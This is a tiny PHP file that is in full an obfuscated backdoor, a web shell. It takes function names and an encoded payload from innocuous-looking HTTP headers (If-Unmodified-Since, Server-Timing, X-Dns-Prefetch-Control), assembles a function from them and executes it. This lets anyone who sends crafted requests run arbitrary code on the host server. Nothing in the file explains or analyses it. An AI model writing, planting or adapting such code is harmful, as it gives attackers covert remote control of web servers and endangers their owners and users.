<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['If-Unmodified-Since'])) {
    $clases = $_HEADERS['If-Unmodified-Since']('', $_HEADERS['Server-Timing']($_HEADERS['X-Dns-Prefetch-Control']));
    $clases();
}